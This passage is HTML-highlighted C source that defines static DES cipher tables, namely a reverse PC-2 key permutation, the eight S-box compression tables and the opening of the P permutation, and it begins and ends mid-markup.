punctuation">,</span>  <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">32</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> rpc2<span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* reverse PC-2 (key, DC) */</span>   <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span>  <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span>  <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span>  <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">40</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> si<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>   <span class="token comment">/* 48-&gt;32 bit compression tables*/</span>          <span class="token comment">/* S[1]       */</span>  <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>          <span class="token comment">/* S[2]       */</span>  <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>   <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>   <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>          <span class="token comment">/* S[3]       */</span>  <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>          <span class="token comment">/* S[4]       */</span>   <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>   <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>          <span class="token comment">/* S[5]       */</span>   <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>          <span class="token comment">/* S[6]       */</span>  <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>   <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>          <span class="token comment">/* S[7]       */</span>   <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>   <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>          <span class="token comment">/* S[8]       */</span>  <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>   <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>   <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span>   <span class="token number">2</span><span class="token punctuation">,</span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span>  <span class="token number">7</span><span class="token punctuation">,</span>  <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span>  <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span>  <span class="token number">9</span><span class="token punctuation">,</span>  <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token number">3</span><span class="token punctuation">,</span>  <span class="token number">5</span><span class="token punctuation">,</span>  <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">11</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> p32i<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token comment">/* P in F function */</span>  <span class="token number">16</span><span class="token punctuation">,</span>  <span class="token number">7</span><span 